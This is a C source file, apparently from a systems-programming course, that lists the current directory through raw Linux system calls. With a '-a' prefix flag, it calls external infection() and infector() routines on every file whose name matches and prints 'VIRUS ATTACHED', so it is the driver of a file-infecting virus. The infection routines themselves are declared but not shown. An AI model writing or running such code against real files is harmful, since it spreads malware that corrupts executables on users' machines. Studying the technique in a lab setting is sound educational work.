#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0

typedef struct ent {
    int  inode;
    int offset;
    short len;
    char buf[1];
} ent;

extern int system_call();
extern int infection();
extern int infector();

int strncmp(const char* str1, const char* str2, unsigned int n)
{
	while(n--)
	{
		if(*str1++!=*str2++)
		{
			return *(unsigned char*)(str1 - 1) - *(unsigned char*)(str2 - 1);
		}
	}
	return 0;
}

unsigned int strlen (const char *str) 
{
  int i = 0;
  while (str[i])
  {
	++i;
  }
  return i;
}



int main (int argc , char* argv[], char* envp[]){
  char buffer[8192];
  int fd = system_call(SYS_OPEN, ".", 0, 0777);
  if (fd < 0){
    system_call(1, 0x55);
  }
  int buffer_length = system_call(141, fd, buffer, 8192); 
  if (buffer_length < 0) {
    system_call(1, 0x55);
  }
  int j,len;
  if(argc < 2){
      ent *newentry;
      for(j = 0; j < buffer_length;)
      {
        newentry = (ent *)(buffer + j); 
        system_call(SYS_WRITE, STDOUT, newentry->buf, strlen(newentry->buf));
        system_call(SYS_WRITE, STDOUT, "\n", 1);
        j += newentry->len;
      }
  } else if(argv[1][0] == '-' && argv[1][1] == 'a'){
    char *prefix = argv[1]+2;
    len = strlen(prefix);
    ent *newentry;
    for(j = 0; j < buffer_length;){
      newentry = (ent *)(buffer + j); 
      if(strncmp(newentry->buf, prefix, len) == 0){
        infection();
        infector(newentry->buf);
        system_call(4, 1, newentry->buf, strlen(newentry->buf));
        system_call(4, 1, " VIRUS ATTACHED\n", 17);
      }
      else{
        system_call(4, 1, newentry->buf, strlen(newentry->buf));
        system_call(4, 1, "\n", 1);
      }
      j += newentry->len;
    }
    system_call(6, fd);
  }
  return 0;
}